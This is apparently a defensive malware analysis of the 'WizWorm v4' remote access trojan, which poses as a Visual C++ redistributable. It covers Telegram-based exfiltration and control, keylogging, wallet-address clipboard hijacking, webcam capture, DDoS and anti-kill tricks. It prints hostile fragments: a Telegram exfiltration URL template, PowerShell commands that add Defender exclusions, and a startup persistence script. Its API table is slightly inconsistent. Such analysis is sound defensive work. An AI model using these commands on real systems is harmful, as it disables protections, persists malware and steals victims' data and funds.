# WizWorm v4 — Full RAT Capability Analysis

> Extracted from `javaw.com` (76,800 bytes), the second payload dropped by ScreenConnect_Patcher_V3.exe

## Disguise

The RAT masquerades as a Microsoft Visual C++ Redistributable:

| Property | Claimed | Actual |
|---|---|---|
| Filename | javaw.com | WizWorm v4 RAT |
| AssemblyTitle | "Microsoft Visual C++ 2015-2022 Redistributable (x64) - 14.44.35112" | WizWorm v4 |
| AssemblyCompany | Microsoft Corporation | Attacker |
| AssemblyCopyright | Copyright (c) Microsoft Corporation. All rights reserved. | — |
| FileVersion | 14.44.35112.1 | — |
| Assembly GUID | bb11cdf9-cee3-43d7-a543-6d5e4e627559 | — |

## Obfuscated Class Structure

All class names are randomly generated strings to hinder static analysis:

```
My.AuXJJhHH278fFfaib3mPYq3fHVtRbccwcURaJFqdbs7EhWNlOwyoGoD9AyO2ggNmC2nJ0s2NqwPe2MDrzAZrA466WURqEI1
  → ApplicationBase (VB.NET framework)

My.lKUTcm0kQNZCGzO460KUTsGCflQ499RIkkyHn
  → Computer info

My.BIsTCLHJJO6y9ADCMp6T7evJfyGj4vmcmfaB0
  → MyWebServices, ThreadSafeObjectProvider

Stub.znf0FlPSWS1X44GGlfHKpW          → Core (24 methods)
Stub.IxWGzdwYyRAnAT7bux8ANk          → C2/Network (48 methods)
Stub.WGwqkdCzSHpwnlsxL5X2Xk          → Persistence/Installation
Stub.1tYJcDHyuMG1VrUjTiiujxAEu...    → Keylogger
Stub.ciByGbkdK89H0OpXYs08G4l1Kt...   → NativeMethods (P/Invoke)
Stub.SWFM5IU8iSVKvxeT085ezOkJiZ...   → NotificationForm
Stub.45OckD0gPqGvNcaUYgmazqFvgs...   → Anti-idle

l3KjadKNELmLssk7LZwiTRfOTTPoePI...   → Entry point / Loader
```

---

## Capability 1: Telegram C2 (Command & Control)

**Protocol**: HTTPS POST to Telegram Bot API

```
URL: https://api.telegram.org/bot{TOKEN}/sendMessage
Params: chat_id={CHAT_ID}&text={DATA}
```

- Uses a hardcoded bot token + chat ID
- All exfiltrated data sent via Telegram messages
- Commands received via Telegram bot polling
- No custom C2 server needed — Telegram infrastructure is the C2

**Commands observed in strings**:
- `New Clinet :` — New victim notification
- `UserName :` / `OSFullName :` — System info collection
- `Urlopen` / `Urlhide` — Show/hide browser windows
- `MessageBox` — Display dialog boxes
- `StartDDos` / `StopDDos` — DDoS control
- `StartReport` / `StopReport` — Reporting mode
- `RunRecovery` / `Recovery` — Recovery mode
- `RunOptions` / `UACFunc` — UAC bypass
- `sendPlugin` / `savePlugin` — Plugin loading

---

## Capability 2: Keylogger

**Method**: `SetWindowsHookEx` with `LowLevelKeyboardProc`

**Tracked keys**:
- All alphanumeric keys
- `[SPACE]`, `[ENTER]`
- `LControlKey`, `RControlKey` (Ctrl)
- `LShiftKey`, `RShiftKey` (Shift)
- `Capital` with state tracking: `[CAPSLOCK: ON]` / `[CAPSLOCK: OFF]`

**Output**: Written to `\Log.tmp` in working directory

---

## Capability 3: Crypto Clipper

Monitors clipboard for cryptocurrency wallet addresses and **silently replaces** them with attacker-controlled addresses.

### Bitcoin (BTC)
```regex
\b(bc1|[13])[a-zA-HJ-NP-Z0-9]{26,45}\b
```
Matches: Legacy (1...), P2SH (3...), Bech32 (bc1...) addresses

### Ethereum (ETH)
```regex
\b(0x)[a-zA-HJ-NP-Z0-9]{40,45}\b
```
Matches: 0x-prefixed 40-45 hex char addresses

### TRON (TRC20)
```regex
T[A-Za-z1-9]{33}
```
Matches: T-prefixed 34 char Base58Check addresses

**Impact**: Victim copies their wallet address → clipper replaces with attacker's → victim pastes attacker's address → funds sent to attacker

---

## Capability 4: Webcam Capture

**DLL**: `avicap32.dll`
**Function**: `capCreateCaptureWindowA`

- Creates hidden capture window
- Captures frames from webcam
- Sends images to C2 via Telegram

---

## Capability 5: DDoS Module

**Commands**: `StartDDos` / `StopDDos`

- Accepts target via C2 command
- Launches flood attacks
- Can be started/stopped remotely

---

## Capability 6: Anti-Kill Protection

```c
// NTDLL P/Invoke
RtlSetProcessIsCritical(TRUE, &oldVal, FALSE);
```

**Effect**:
- Process marked as "critical system process"
- Task Manager cannot end it ("Access Denied")
- Force-terminating causes **BSOD** (KERNEL_DATA_INPAGE_ERROR)
- Only way to kill: `RtlSetProcessIsCritical(FALSE)` first, then terminate

---

## Capability 7: Anti-Idle

```c
SetThreadExecutionState(ES_CONTINUOUS | ES_SYSTEM_REQUIRED | ES_AWAYMODE_REQUIRED);
```

- Prevents screensaver, sleep, and hibernation
- Keeps system awake for continuous C2 communication

---

## Capability 8: Windows Defender Bypass

```powershell
powershell.exe -ExecutionPolicy Bypass Add-MpPreference -ExclusionPath "{RAT_PATH}"
powershell.exe -ExecutionPolicy Bypass Add-MpPreference -ExclusionProcess "{RAT_PROCESS}"
```

- Adds RAT directory to Defender exclusion list
- All files in that path are no longer scanned
- Runs silently via `-ExecutionPolicy Bypass`

---

## Capability 9: Persistence

### Method 1: Startup Shortcut
```vbs
Set WScript.Shell = CreateObject("WScript.Shell")
Set shortcut = shell.CreateShortcut(startup_path & "\" & name & ".lnk")
shortcut.TargetPath = RAT_path
shortcut.WorkingDirectory = RAT_directory
shortcut.Save()
```

### Method 2: Registry
```
HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\ShowSuperHidden
→ Set to 0 (hide super-hidden files)
```

### Method 3: AppData Deployment
```
%APPDATA%\{random_name}\ → RAT copied here
LNK shortcut icon spoofed from registry:
  HKEY_LOCAL_MACHINE\software\classes\{ext}\DefaultIcon
```

---

## Capability 10: System Recon

**Data collected on first run**:
- `New Clinet :` — New victim marker
- `UserName :` — Windows username
- `OSFullName :` — OS version
- HWID — Hardware ID tracking
- Service Pack version

**Antivirus detection**:
```wmi
\\root\SecurityCenter2 → SELECT * FROM AntivirusProduct
```
Queries WMI for installed antivirus products to report back to C2.

---

## Capability 11: Plugin System

- `sendPlugin` — Send plugin to C2
- `savePlugin` — Save/load plugin from disk
- `OfflineGet` — Queue commands for offline execution

Allows the attacker to deploy additional capabilities post-infection without updating the base RAT.

---

## P/Invoke (Native API) Summary

| DLL | Function | Purpose |
|---|---|---|
| avicap32.dll | capCreateCaptureWindowA | Webcam capture |
| user32.dll | SetWindowsHookEx | Keylogger hook |
| user32.dll | GetWindowThreadProcessId | Window enumeration |
| user32.dll | GetAsyncKeyState | Key state checking |
| kernel32.dll | GetModuleHandle | Module enumeration |
| kernel32.dll | RtlSetProcessIsCritical | Anti-kill protection |
| kernel32.dll | SetThreadExecutionState | Anti-idle |
| NTdll.dll | RtlSetProcessIsCritical | Critical process flag |
